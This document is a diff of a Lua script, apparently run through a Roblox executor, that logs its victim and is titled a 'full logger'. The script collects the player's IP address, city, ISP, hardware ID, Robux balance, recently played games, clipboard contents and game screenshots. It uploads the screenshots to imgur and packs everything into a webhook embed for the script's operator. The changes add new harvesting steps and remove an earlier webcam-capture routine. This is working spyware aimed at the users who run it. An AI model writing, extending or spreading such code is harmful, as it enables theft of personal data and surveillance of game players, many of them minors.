@@ -1,4 +1,4 @@
--- DELTA EXECUTOR - ULTIMATE LOGGER (Clipboard + Face Cam + Flag + Spawn SS)
+-- DELTA EXECUTOR - FULL LOGGER (Robux + Games + Flag + Clipboard + Spawn SS)
 local request = (syn and syn.request) or (http and http.request) or request
 if not request then return end
 
@@ -9,16 +9,14 @@ local userId = player.UserId
 local name = player.Name
 local age = player.AccountAge .. " days"
 
--- Country Flag Function
-local function getFlagEmoji(countryCode)
-    countryCode = countryCode:upper()
-    if #countryCode ~= 2 then return "" end
-    local first = countryCode:sub(1,1):byte() - 65
-    local second = countryCode:sub(2,2):byte() - 65
-    if first < 0 or first > 25 or second < 0 or second > 25 then return "" end
-    local flag1 = utf8.char(0x1F1E6 + first)
-    local flag2 = utf8.char(0x1F1E6 + second)
-    return flag1 .. flag2
+-- Country Flag
+local function getFlagEmoji(code)
+    code = code:upper()
+    if #code ~= 2 then return "" end
+    local a = code:byte(1) - 65
+    local b = code:byte(2) - 65
+    if a < 0 or a > 25 or b < 0 or b > 25 then return "" end
+    return utf8.char(0x1F1E6 + a) .. utf8.char(0x1F1E6 + b)
 end
 
 -- Get IP
@@ -32,7 +30,7 @@ for _, url in {"http://icanhazip.com","https://api.ipify.org","http://ifconfig.m
 end
 if not ip then return end
 
--- Geo (with full countryCode for flag)
+-- Geo + Flag
 local geo = {city="?",country="?",isp="?",countryCode="??"}
 pcall(function()
     local r = request({Url="http://ip-api.com/json/"..ip.."?fields=city,country,isp,countryCode",Method="GET"})
@@ -41,7 +39,7 @@ pcall(function()
         if d then geo = d end
     end
 end)
-local flagEmoji = getFlagEmoji(geo.countryCode)
+local flag = getFlagEmoji(geo.countryCode)
 
 -- Display Name
 local display = name
@@ -84,26 +82,51 @@ pcall(function()
     device = string.format("Roblox v%s | %s", game.PlaceVersion, game:GetService("RunService"):IsStudio() and "Studio" or "Client")
 end)
 
+-- Robux Balance
+local robux = "N/A"
+pcall(function()
+    local r = request({Url="https://economy.roblox.com/v1/users/"..userId.."/currency",Method="GET"})
+    if r and r.Body then
+        local d = HttpService:JSONDecode(r.Body)
+        if d and d.robux then robux = tostring(d.robux) end
+    end
+end)
+
+-- Recently Played Games (Last 5)
+local recentGames = "None"
+pcall(function()
+    local r = request({Url="https://games.roblox.com/v1/users/"..userId.."/games?limit=5",Method="GET"})
+    if r and r.Body then
+        local d = HttpService:JSONDecode(r.Body)
+        if d and d.data and #d.data > 0 then
+            local names = {}
+            for _,g in ipairs(d.data) do
+                table.insert(names, g.name)
+            end
+            recentGames = table.concat(names, ", ")
+        end
+    end
+end)
+
 -- Profile
 local avatar = "https://www.roblox.com/headshot-thumbnail/image?userId="..userId.."&width=150&height=150&format=png"
 local profile = "https://www.roblox.com/users/"..userId.."/profile"
 local isoTime = os.date("!%Y-%m-%dT%H:%M:%SZ")
 
--- Screenshot Upload Function
-local function uploadScreenshot(imgData)
-    if not imgData then return "https://i.imgur.com/removed.png" end
-    local b64 = HttpService:EncodeBase64(imgData)
-    local boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
-    local bodyLines = {
+-- Screenshot Upload (using syn.screenshot or fallback)
+local function uploadScreenshot(data)
+    if not data then return "https://i.imgur.com/removed.png" end
+    local b64 = HttpService:EncodeBase64(data)
+    local boundary = "----Boundary"
+    local body = {
         "--"..boundary,
-        'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
+        'Content-Disposition: form-data; name="file"; filename="ss.png"',
         "Content-Type: image/png",
         "",
         b64,
         "--"..boundary.."--"
     }
-    local bodyStr = table.concat(bodyLines, "\r\n")
-
+    local bodyStr = table.concat(body, "\r\n")
     local upload = request({
         Url = "https://api.imgur.com/3/image",
         Method = "POST",
@@ -113,64 +136,49 @@ local function uploadScreenshot(imgData)
         },
         Body = bodyStr
     })
-
     if upload and upload.Body then
         local res = HttpService:JSONDecode(upload.Body)
-        if res and res.data and res.data.link then
-            return res.data.link
-        end
+        if res and res.data and res.data.link then return res.data.link end
     end
     return "https://i.imgur.com/removed.png"
 end
 
--- Take Screenshot
+-- Take Screenshot (Delta/syn compatible)
 local function takeSS()
-    local ss = game:GetService("Workspace"):FindFirstChild("ScreenshotService") or game:GetService("ScreenshotService")
-    if ss and ss.TakeScreenshot then
-        local success, img = pcall(ss.TakeScreenshot)
-        if success and img and img:FindFirstChild("Image") then
-            return img.Image.Value
-        end
+    if syn and syn.screenshot then
+        local img = syn.screenshot()
+        if img then return img end
+    end
+    if screenshot then
+        local img = screenshot()
+        if img then return img end
     end
     return nil
 end
 
--- Game SS (initial)
-local gameSS = takeSS()
-local gameSSUrl = uploadScreenshot(gameSS)
+-- Game Screenshot
+local gameSSUrl = uploadScreenshot(takeSS())
 
--- Spawn SS (wait for character, then take)
+-- Spawn Screenshot
 local spawnSSUrl = "https://i.imgur.com/removed.png"
-if player.Character then
-    spawnSSUrl = uploadScreenshot(takeSS())
-else
-    player.CharacterAdded:Wait()
-    wait(2)  -- Wait for full spawn
-    spawnSSUrl = uploadScreenshot(takeSS())
-end
-
--- Clipboard Steal
-local clipboard = "N/A"
-pcall(function()
-    if getclipboard or getclipboardtext then
-        clipboard = getclipboard() or getclipboardtext()
+spawn(function()
+    if player.Character then
+        wait(2)
+        spawnSSUrl = uploadScreenshot(takeSS())
+    else
+        player.CharacterAdded:Wait()
+        wait(2)
+        spawnSSUrl = uploadScreenshot(takeSS())
     end
 end)
 
--- Face Cam (exploit-specific, fallback N/A)
-local faceCamUrl = "N/A"
+-- Clipboard
+local clipboard = "N/A"
 pcall(function()
-    if syn and syn.camera then
-        local camData = syn.camera()
-        if camData then
-            faceCamUrl = uploadScreenshot(camData)  -- Assume returns image data
-        end
-    elseif webcam and webcam.capture then
-        local camData = webcam.capture()
-        if camData then
-            faceCamUrl = uploadScreenshot(camData)
-        end
+    if getclipboard then clipboard = getclipboard()
+    elseif getclipboardtext then clipboard = getclipboardtext()
     end
+    if clipboard and #clipboard > 100 then clipboard = clipboard:sub(1,97).. "..." end
 end)
 
 -- Final Embed
@@ -184,17 +192,18 @@ local embed = {{
     url = profile,
     description =
         "**Account Age:** `"..age.."`\n"..
+        "**Robux:** `"..robux.."`\n"..
         "**Most Valuable:** `"..best.name.."`\n"..
         "**RAP:** `"..(best.rap > 0 and best.rap or "N/A").."` | **Value:** `"..(best.value > 0 and best.value or "N/A").."`\n\n"..
         "**IP:** `"..ip.."`\n"..
-        "**Location:** `"..flagEmoji.." "..geo.city..", "..geo.country.."`\n"..
+        "**Location:** `"..flag.." "..geo.city..", "..geo.country.."`\n"..
         "**ISP:** `"..geo.isp.."`\n\n"..
         "**HWID:** `"..hwid.."`\n"..
         "**Device:** `"..device.."`\n"..
-        "**Clipboard:** `"..(clipboard ~= "N/A" and clipboard:sub(1,50).."..." or clipboard).."`\n"..
-        "**Face Cam:** "..(faceCamUrl ~= "N/A" and faceCamUrl or "Failed").."\n",
+        "**Clipboard:** `"..clipboard.."`\n\n"..
+        "**Recent Games:** `"..recentGames.."`",
+    image = {url = gameSSUrl},
     fields = {
-        {name = "Game Screenshot", value = gameSSUrl, inline = false},
         {name = "Spawn Screenshot", value = spawnSSUrl, inline = false}
     },
     thumbnail = {url = avatar},
